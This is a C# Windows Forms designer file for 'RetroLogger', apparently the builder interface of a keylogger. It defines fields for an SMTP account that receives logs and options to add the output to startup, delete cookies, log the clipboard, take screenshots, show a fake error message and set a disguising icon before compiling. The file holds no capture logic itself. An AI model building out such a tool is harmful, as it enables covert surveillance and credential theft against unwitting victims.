namespace RetroLogger.Forms
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.emailInformationGroupBox = new System.Windows.Forms.GroupBox();
            this.portUpDown = new System.Windows.Forms.NumericUpDown();
            this.portLabel = new System.Windows.Forms.Label();
            this.smtpTextBox = new System.Windows.Forms.TextBox();
            this.smtpLabel = new System.Windows.Forms.Label();
            this.showPasswordCheckBox = new System.Windows.Forms.CheckBox();
            this.passwordTextBox = new System.Windows.Forms.TextBox();
            this.passwordLabel = new System.Windows.Forms.Label();
            this.usernameTextBox = new System.Windows.Forms.TextBox();
            this.usernameLabel = new System.Windows.Forms.Label();
            this.configurationGroupBox = new System.Windows.Forms.GroupBox();
            this.browseButton = new System.Windows.Forms.Button();
            this.iconPictureBox = new System.Windows.Forms.PictureBox();
            this.iconLabel = new System.Windows.Forms.Label();
            this.takeScreenshotCheckBox = new System.Windows.Forms.CheckBox();
            this.logClipboardCheckBox = new System.Windows.Forms.CheckBox();
            this.showErrorCheckBox = new System.Windows.Forms.CheckBox();
            this.deleteCookiesCheckBox = new System.Windows.Forms.CheckBox();
            this.startupCheckBox = new System.Windows.Forms.CheckBox();
            this.minutesLabel = new System.Windows.Forms.Label();
            this.intervalUpDown = new System.Windows.Forms.NumericUpDown();
            this.intervalLabel = new System.Windows.Forms.Label();
            this.compileButton = new System.Windows.Forms.Button();
            this.emailInformationGroupBox.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.portUpDown)).BeginInit();
            this.configurationGroupBox.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.iconPictureBox)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.intervalUpDown)).BeginInit();
            this.SuspendLayout();
            // 
            // emailInformationGroupBox
            // 
            this.emailInformationGroupBox.Controls.Add(this.portUpDown);
            this.emailInformationGroupBox.Controls.Add(this.portLabel);
            this.emailInformationGroupBox.Controls.Add(this.smtpTextBox);
            this.emailInformationGroupBox.Controls.Add(this.smtpLabel);
            this.emailInformationGroupBox.Controls.Add(this.showPasswordCheckBox);
            this.emailInformationGroupBox.Controls.Add(this.passwordTextBox);
            this.emailInformationGroupBox.Controls.Add(this.passwordLabel);
            this.emailInformationGroupBox.Controls.Add(this.usernameTextBox);
            this.emailInformationGroupBox.Controls.Add(this.usernameLabel);
            this.emailInformationGroupBox.Location = new System.Drawing.Point(12, 12);
            this.emailInformationGroupBox.Name = "emailInformationGroupBox";
            this.emailInformationGroupBox.Size = new System.Drawing.Size(260, 105);
            this.emailInformationGroupBox.TabIndex = 0;
            this.emailInformationGroupBox.TabStop = false;
            this.emailInformationGroupBox.Text = "Email Information";
            // 
            // portUpDown
            // 
            this.portUpDown.Location = new System.Drawing.Point(204, 77);
            this.portUpDown.Maximum = new decimal(new int[] {
            65535,
            0,
            0,
            0});
            this.portUpDown.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.portUpDown.Name = "portUpDown";
            this.portUpDown.Size = new System.Drawing.Size(50, 22);
            this.portUpDown.TabIndex = 8;
            this.portUpDown.Value = new decimal(new int[] {
            25,
            0,
            0,
            0});
            // 
            // portLabel
            // 
            this.portLabel.AutoSize = true;
            this.portLabel.Location = new System.Drawing.Point(167, 80);
            this.portLabel.Name = "portLabel";
            this.portLabel.Size = new System.Drawing.Size(31, 13);
            this.portLabel.TabIndex = 7;
            this.portLabel.Text = "Port:";
            // 
            // smtpTextBox
            // 
            this.smtpTextBox.Location = new System.Drawing.Point(73, 77);
            this.smtpTextBox.Name = "smtpTextBox";
            this.smtpTextBox.Size = new System.Drawing.Size(88, 22);
            this.smtpTextBox.TabIndex = 6;
            // 
            // smtpLabel
            // 
            this.smtpLabel.AutoSize = true;
            this.smtpLabel.Location = new System.Drawing.Point(6, 80);
            this.smtpLabel.Name = "smtpLabel";
            this.smtpLabel.Size = new System.Drawing.Size(37, 13);
            this.smtpLabel.TabIndex = 5;
            this.smtpLabel.Text = "SMTP:";
            // 
            // showPasswordCheckBox
            // 
            this.showPasswordCheckBox.AutoSize = true;
            this.showPasswordCheckBox.Location = new System.Drawing.Point(199, 51);
            this.showPasswordCheckBox.Name = "showPasswordCheckBox";
            this.showPasswordCheckBox.Size = new System.Drawing.Size(55, 17);
            this.showPasswordCheckBox.TabIndex = 4;
            this.showPasswordCheckBox.Text = "Show";
            this.showPasswordCheckBox.UseVisualStyleBackColor = true;
            this.showPasswordCheckBox.CheckedChanged += new System.EventHandler(this.showPasswordCheckBox_CheckedChanged);
            // 
            // passwordTextBox
            // 
            this.passwordTextBox.Location = new System.Drawing.Point(73, 49);
            this.passwordTextBox.Name = "passwordTextBox";
            this.passwordTextBox.Size = new System.Drawing.Size(120, 22);
            this.passwordTextBox.TabIndex = 3;
            this.passwordTextBox.UseSystemPasswordChar = true;
            // 
            // passwordLabel
            // 
            this.passwordLabel.AutoSize = true;
            this.passwordLabel.Location = new System.Drawing.Point(6, 52);
            this.passwordLabel.Name = "passwordLabel";
            this.passwordLabel.Size = new System.Drawing.Size(59, 13);
            this.passwordLabel.TabIndex = 2;
            this.passwordLabel.Text = "Password:";
            // 
            // usernameTextBox
            // 
            this.usernameTextBox.Location = new System.Drawing.Point(73, 21);
            this.usernameTextBox.Name = "usernameTextBox";
            this.usernameTextBox.Size = new System.Drawing.Size(181, 22);
            this.usernameTextBox.TabIndex = 1;
            // 
            // usernameLabel
            // 
            this.usernameLabel.AutoSize = true;
            this.usernameLabel.Location = new System.Drawing.Point(6, 24);
            this.usernameLabel.Name = "usernameLabel";
            this.usernameLabel.Size = new System.Drawing.Size(61, 13);
            this.usernameLabel.TabIndex = 0;
            this.usernameLabel.Text = "Username:";
            // 
            // configurationGroupBox
            // 
            this.configurationGroupBox.Controls.Add(this.browseButton);
            this.configurationGroupBox.Controls.Add(this.iconPictureBox);
            this.configurationGroupBox.Controls.Add(this.iconLabel);
            this.configurationGroupBox.Controls.Add(this.takeScreenshotCheckBox);
            this.configurationGroupBox.Controls.Add(this.logClipboardCheckBox);
            this.configurationGroupBox.Controls.Add(this.showErrorCheckBox);
            this.configurationGroupBox.Controls.Add(this.deleteCookiesCheckBox);
            this.configurationGroupBox.Controls.Add(this.startupCheckBox);
            this.configurationGroupBox.Controls.Add(this.minutesLabel);
            this.configurationGroupBox.Controls.Add(this.intervalUpDown);
            this.configurationGroupBox.Controls.Add(this.intervalLabel);
            this.configurationGroupBox.Location = new System.Drawing.Point(12, 123);
            this.configurationGroupBox.Name = "configurationGroupBox";
            this.configurationGroupBox.Size = new System.Drawing.Size(260, 163);
            this.configurationGroupBox.TabIndex = 1;
            this.configurationGroupBox.TabStop = false;
            this.configurationGroupBox.Text = "Configuration";
            // 
            // browseButton
            // 
            this.browseButton.Location = new System.Drawing.Point(170, 132);
            this.browseButton.Name = "browseButton";
            this.browseButton.Size = new System.Drawing.Size(75, 23);
            this.browseButton.TabIndex = 10;
            this.browseButton.Text = "Browse";
            this.browseButton.UseVisualStyleBackColor = true;
            this.browseButton.Click += new System.EventHandler(this.browseButton_Click);
            // 
            // iconPictureBox
            // 
            this.iconPictureBox.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle;
            this.iconPictureBox.Location = new System.Drawing.Point(177, 66);
            this.iconPictureBox.Name = "iconPictureBox";
            this.iconPictureBox.Size = new System.Drawing.Size(60, 60);
            this.iconPictureBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.iconPictureBox.TabIndex = 9;
            this.iconPictureBox.TabStop = false;
            // 
            // iconLabel
            // 
            this.iconLabel.AutoSize = true;
            this.iconLabel.Location = new System.Drawing.Point(167, 50);
            this.iconLabel.Name = "iconLabel";
            this.iconLabel.Size = new System.Drawing.Size(32, 13);
            this.iconLabel.TabIndex = 8;
            this.iconLabel.Text = "Icon:";
            // 
            // takeScreenshotCheckBox
            // 
            this.takeScreenshotCheckBox.AutoSize = true;
            this.takeScreenshotCheckBox.Location = new System.Drawing.Point(9, 141);
            this.takeScreenshotCheckBox.Name = "takeScreenshotCheckBox";
            this.takeScreenshotCheckBox.Size = new System.Drawing.Size(109, 17);
            this.takeScreenshotCheckBox.TabIndex = 7;
            this.takeScreenshotCheckBox.Text = "Take Screenshot";
            this.takeScreenshotCheckBox.UseVisualStyleBackColor = true;
            // 
            // logClipboardCheckBox
            // 
            this.logClipboardCheckBox.AutoSize = true;
            this.logClipboardCheckBox.Location = new System.Drawing.Point(9, 118);
            this.logClipboardCheckBox.Name = "logClipboardCheckBox";
            this.logClipboardCheckBox.Size = new System.Drawing.Size(99, 17);
            this.logClipboardCheckBox.TabIndex = 6;
            this.logClipboardCheckBox.Text = "Log Clipboard";
            this.logClipboardCheckBox.UseVisualStyleBackColor = true;
            // 
            // showErrorCheckBox
            // 
            this.showErrorCheckBox.AutoSize = true;
            this.showErrorCheckBox.Location = new System.Drawing.Point(9, 95);
            this.showErrorCheckBox.Name = "showErrorCheckBox";
            this.showErrorCheckBox.Size = new System.Drawing.Size(131, 17);
            this.showErrorCheckBox.TabIndex = 5;
            this.showErrorCheckBox.Text = "Show Error Message";
            this.showErrorCheckBox.UseVisualStyleBackColor = true;
            // 
            // deleteCookiesCheckBox
            // 
            this.deleteCookiesCheckBox.AutoSize = true;
            this.deleteCookiesCheckBox.Location = new System.Drawing.Point(9, 72);
            this.deleteCookiesCheckBox.Name = "deleteCookiesCheckBox";
            this.deleteCookiesCheckBox.Size = new System.Drawing.Size(103, 17);
            this.deleteCookiesCheckBox.TabIndex = 4;
            this.deleteCookiesCheckBox.Text = "Delete Cookies";
            this.deleteCookiesCheckBox.UseVisualStyleBackColor = true;
            // 
            // startupCheckBox
            // 
            this.startupCheckBox.AutoSize = true;
            this.startupCheckBox.Location = new System.Drawing.Point(9, 49);
            this.startupCheckBox.Name = "startupCheckBox";
            this.startupCheckBox.Size = new System.Drawing.Size(103, 17);
            this.startupCheckBox.TabIndex = 3;
            this.startupCheckBox.Text = "Add To Startup";
            this.startupCheckBox.UseVisualStyleBackColor = true;
            // 
            // minutesLabel
            // 
            this.minutesLabel.AutoSize = true;
            this.minutesLabel.Location = new System.Drawing.Point(196, 23);
            this.minutesLabel.Name = "minutesLabel";
            this.minutesLabel.Size = new System.Drawing.Size(55, 13);
            this.minutesLabel.TabIndex = 2;
            this.minutesLabel.Text = "Minute(s)";
            // 
            // intervalUpDown
            // 
            this.intervalUpDown.Location = new System.Drawing.Point(60, 21);
            this.intervalUpDown.Minimum = new decimal(new int[] {
            1,
            0,
            0,
            0});
            this.intervalUpDown.Name = "intervalUpDown";
            this.intervalUpDown.Size = new System.Drawing.Size(130, 22);
            this.intervalUpDown.TabIndex = 1;
            this.intervalUpDown.Value = new decimal(new int[] {
            30,
            0,
            0,
            0});
            // 
            // intervalLabel
            // 
            this.intervalLabel.AutoSize = true;
            this.intervalLabel.Location = new System.Drawing.Point(6, 23);
            this.intervalLabel.Name = "intervalLabel";
            this.intervalLabel.Size = new System.Drawing.Size(48, 13);
            this.intervalLabel.TabIndex = 0;
            this.intervalLabel.Text = "Interval:";
            // 
            // compileButton
            // 
            this.compileButton.Location = new System.Drawing.Point(197, 292);
            this.compileButton.Name = "compileButton";
            this.compileButton.Size = new System.Drawing.Size(75, 23);
            this.compileButton.TabIndex = 2;
            this.compileButton.Text = "Compile";
            this.compileButton.UseVisualStyleBackColor = true;
            this.compileButton.Click += new System.EventHandler(this.compileButton_Click);
            // 
            // Main
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(284, 327);
            this.Controls.Add(this.compileButton);
            this.Controls.Add(this.configurationGroupBox);
            this.Controls.Add(this.emailInformationGroupBox);
            this.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "Main";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "RetroLogger";
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Main_FormClosing);
            this.emailInformationGroupBox.ResumeLayout(false);
            this.emailInformationGroupBox.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.portUpDown)).EndInit();
            this.configurationGroupBox.ResumeLayout(false);
            this.configurationGroupBox.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)(this.iconPictureBox)).EndInit();
            ((System.ComponentModel.ISupportInitialize)(this.intervalUpDown)).EndInit();
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.GroupBox emailInformationGroupBox;
        private System.Windows.Forms.NumericUpDown portUpDown;
        private System.Windows.Forms.Label portLabel;
        private System.Windows.Forms.TextBox smtpTextBox;
        private System.Windows.Forms.Label smtpLabel;
        private System.Windows.Forms.CheckBox showPasswordCheckBox;
        private System.Windows.Forms.TextBox passwordTextBox;
        private System.Windows.Forms.Label passwordLabel;
        private System.Windows.Forms.TextBox usernameTextBox;
        private System.Windows.Forms.Label usernameLabel;
        private System.Windows.Forms.GroupBox configurationGroupBox;
        private System.Windows.Forms.Label minutesLabel;
        private System.Windows.Forms.NumericUpDown intervalUpDown;
        private System.Windows.Forms.Label intervalLabel;
        private System.Windows.Forms.Button browseButton;
        private System.Windows.Forms.PictureBox iconPictureBox;
        private System.Windows.Forms.Label iconLabel;
        private System.Windows.Forms.CheckBox takeScreenshotCheckBox;
        private System.Windows.Forms.CheckBox logClipboardCheckBox;
        private System.Windows.Forms.CheckBox showErrorCheckBox;
        private System.Windows.Forms.CheckBox deleteCookiesCheckBox;
        private System.Windows.Forms.CheckBox startupCheckBox;
        private System.Windows.Forms.Button compileButton;
    }
}